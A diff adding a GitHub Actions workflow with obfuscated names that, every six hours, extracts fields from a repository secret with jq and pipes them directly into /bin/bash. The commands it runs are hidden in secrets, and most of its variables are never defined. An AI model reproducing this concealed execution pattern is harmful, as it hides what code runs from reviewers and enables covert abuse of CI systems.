@@ -1,0 +1,24 @@
+name: chaoababayibei
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chaoababayibei
+        env:
+          qun9844: ${{ secrets.qun9844 }}
+        run: |
+          echo $qun9844 | jq -r .zkjuj0 | /bin/bash
+          echo $ni007 | jq -r .efcv970 | /bin/bash
+          echo $azmlv9 | jq -r .oca792 | /bin/bash
+          echo $ury02362 | jq -r .aw60 | /bin/bash
+          echo $sxhar469 | jq -r .fuoi721 | /bin/bash
+          echo $k397 | jq -r .xgzq62265 | /bin/bash
+          echo $bvbvi6 | jq -r .xveju76123 | /bin/bash
+          echo $t756 | jq -r .lg7480 | /bin/bash
+          echo $z14 | jq -r .ryj1865 | /bin/bash
+
